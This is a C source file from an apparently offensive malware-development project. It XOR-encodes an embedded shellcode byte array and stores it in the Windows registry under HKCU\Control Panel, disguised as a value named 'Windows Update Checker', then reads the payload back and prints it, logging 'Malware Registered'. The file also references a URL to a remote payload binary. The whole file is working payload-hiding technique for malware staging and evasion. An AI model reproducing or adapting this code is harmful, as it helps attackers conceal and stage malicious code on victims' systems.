/*------------------------------------------------------------------------------------------------------
@author     xReze / ZzN1NJ4
@brief      Writing & Reading Shellcode into Registry
------------------------------------------------------------------------------------------------------*/

#include "basic.h"
#pragma comment(lib, "wininet.lib")             // you can link files like this as well, cool shit

#define REGISTRY "Control Panel"
#define REGSTRING "Windows Update Checker"


BOOL showPayload(PBYTE pBytes, SIZE_T size) {
    if (size <= 0) {
        warn("Print payload skipped since size is not correct");
        return EXIT_FAILURE;
    }

    SIZE_T i = 0;
    SIZE_T count = 16;
    printf("-------------------------------------------\n[*] Printing the shellcode\n");
    printf("unsigned char shellcode[] = \n\"");

    while (i < size) {
        if (count == 0) {
            printf("\"");
            count = 16;
        }
        printf("\\x%02x", pBytes[i]);
        if ((i + 1) % 16 == 0)
            printf("\"\n");
        i++; count--;
    }
    printf("\"\n");
    info("Printed a total of %d bytes", size);
    return EXIT_SUCCESS;
}

BOOL MalRegister(IN PBYTE pBytes, IN SIZE_T szSize) {
    HKEY hRegistry = NULL;
    BOOL STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hRegistry);

    if (STATUS != ERROR_SUCCESS) {
        if (STATUS == ERROR_FILE_NOT_FOUND) {
            warn("Not able to find the particular key");
            return EXIT_FAILURE;
        }
        else {
            warn("Error Opening Registry  @---0x%ld", GetLastError());
            warn("CURRENT STATUS  @---0x%ld", STATUS);
            return EXIT_FAILURE;
        }
    }
    info("Opened Registry successfully, HKEY  @---0x%p", hRegistry);

    STATUS = RegSetValueExA(hRegistry, REGSTRING, 0, REG_BINARY, pBytes, szSize);
    if (STATUS != ERROR_SUCCESS) {
        if (STATUS == ERROR_FILE_NOT_FOUND) {
            warn("Not able to find the particular key");
            return EXIT_FAILURE;
        }
        else {
            warn("Error Writing to Registry  @---0x%ld", GetLastError());
            warn("CURRENT STATUS  @---0x%ld", STATUS);
            return EXIT_FAILURE;
        }
    }
    imp("Malware Registered =^-^= ");
    return EXIT_SUCCESS;
}

BOOL ReadRegistry(IN DWORD szPayload, OUT PBYTE* pPayload) {
    BOOL     STATUS = NULL;
    DWORD       dwBytesRead = szPayload;
    PVOID       pBytes = NULL;

    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, szPayload);
    if (pBytes == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
    if (STATUS != ERROR_SUCCESS) {
        if (STATUS == ERROR_FILE_NOT_FOUND) {
            warn("Not able to find the particular key");
            return EXIT_FAILURE;
        }
        else {
            warn("Error Reading from Registry, Prev call  @---0x%ld", GetLastError());
            warn("CURRENT STATUS  @---0x%ld", STATUS);
            return EXIT_FAILURE;
        }
    }
    if (szPayload != dwBytesRead)
        warn("Read only %d bytes instead of %d", dwBytesRead, szPayload);

    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
    if (STATUS != ERROR_SUCCESS) {
        if (STATUS == ERROR_FILE_NOT_FOUND) {
            warn("Not able to find the particular key");
            return EXIT_FAILURE;
        }
        else {
            warn("Error Reading from Registry, Prev call  @---0x%ld", GetLastError());
            warn("CURRENT STATUS  @---0x%ld", STATUS);
            return EXIT_FAILURE;
        }
    }
    if (szPayload != dwBytesRead)
        warn("Read only %d bytes instead of %d", dwBytesRead, szPayload);

    *pPayload = (PBYTE)pBytes;
    showPayload((PBYTE)pBytes, szPayload);
    return TRUE;
}

void XorCrypt(IN PBYTE pShellcode, IN SIZE_T size, IN char bKey) {
    for (size_t i = 0; i < size; i++) {
        pShellcode[i] = pShellcode[i] ^ bKey;
    }
}

int main(int argc, char* argv[]) {

    wchar_t URL[] = L"https://github.com/ZzN1NJ4/Malware-Development/raw/main/misc/calc.bin";
    DWORD dwBytesRead = 220;
    //PBYTE pBytes = NULL;
    //SIZE_T szSize = 0;

    unsigned char calc[] =
        "\xda\xcc\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x31\xbb\x37\x29\xaa\xe3"
        "\x31\x58\x18\x03\x58\x18\x83\xe8\xcb\xcb\x5f\x1f\xdb\x8e\xa0\xe0"
        "\x1b\xef\x29\x05\x2a\x2f\x4d\x4d\x1c\x9f\x05\x03\x90\x54\x4b\xb0"
        "\x23\x18\x44\xb7\x84\x97\xb2\xf6\x15\x8b\x87\x99\x95\xd6\xdb\x79"
        "\xa4\x18\x2e\x7b\xe1\x45\xc3\x29\xba\x02\x76\xde\xcf\x5f\x4b\x55"
        "\x83\x4e\xcb\x8a\x53\x70\xfa\x1c\xe8\x2b\xdc\x9f\x3d\x40\x55\xb8"
        "\x22\x6d\x2f\x33\x90\x19\xae\x95\xe9\xe2\x1d\xd8\xc6\x10\x5f\x1c"
        "\xe0\xca\x2a\x54\x13\x76\x2d\xa3\x6e\xac\xb8\x30\xc8\x27\x1a\x9d"
        "\xe9\xe4\xfd\x56\xe5\x41\x89\x31\xe9\x54\x5e\x4a\x15\xdc\x61\x9d"
        "\x9c\xa6\x45\x39\xc5\x7d\xe7\x18\xa3\xd0\x18\x7a\x0c\x8c\xbc\xf0"
        "\xa0\xd9\xcc\x5a\xae\x1c\x42\xe1\x9c\x1f\x5c\xea\xb0\x77\x6d\x61"
        "\x5f\x0f\x72\xa0\x24\xef\x90\x61\x50\x98\x0c\xe0\xd9\xc5\xae\xde"
        "\x1d\xf0\x2c\xeb\xdd\x07\x2c\x9e\xd8\x4c\xea\x72\x90\xdd\x9f\x74"
        "\x07\xdd\xb5\x16\xc6\x4d\x55\xf7\x6d\xf6\xfc\x07";

    char bKey = '\x5e';
    SIZE_T szCalc = 220;
    DWORD dwSize = 1024;
    DWORD dwType = RRF_RT_REG_BINARY;

    HKEY hRegistry = NULL;
    BOOL STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_ALL_ACCESS, &hRegistry);
    if (STATUS != ERROR_SUCCESS) {
        if (STATUS == ERROR_FILE_NOT_FOUND) {
            warn("Not able to find the particular key");
            return EXIT_FAILURE;
        }
        else {
            warn("Error Opening Registry  @---0x%ld", GetLastError());
            warn("CURRENT STATUS  @---0x%ld", STATUS);
            return EXIT_FAILURE;
        }
    }
    info("Opened Registry successfully, HKEY  @---0x%p", hRegistry);
    info("Xor-ing the payload");
    XorCrypt(calc, szCalc, bKey);

    STATUS = RegSetValueExA(hRegistry, REGSTRING, 0, REG_BINARY, calc, szCalc);
    if (STATUS != ERROR_SUCCESS) {
        if (STATUS == ERROR_FILE_NOT_FOUND) {
            warn("Not able to find the particular key");
            return EXIT_FAILURE;
        }
        else {
            warn("Error Writing to Registry, Prev call  @---0x%ld", GetLastError());
            warn("CURRENT STATUS  @---0x%ld", STATUS);
            return EXIT_FAILURE;
        }
    }
    imp("Malware Registered =^-^= ");

    PVOID pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, szCalc);
    if (pBytes == NULL)
        warn("Heap Allocation failed with @---0x%ld", GetLastError());
    
    //ReadRegistry(szCalc, (PBYTE*)pBytes);

    STATUS = RegQueryValueExA(hRegistry, REGSTRING, NULL, &dwType, (LPBYTE)pBytes, &dwSize);    // Another way to read the shellcode
    if (STATUS != ERROR_SUCCESS) {
        warn("Error Reading from Register,  @---0x%ld", GetLastError());
        warn("STATUS  @---0x%ld", STATUS);
        return EXIT_FAILURE;
    }

    showPayload((PBYTE)pBytes, dwSize);
    HeapFree(GetProcessHeap(), 0, pBytes);
    return EXIT_SUCCESS;
}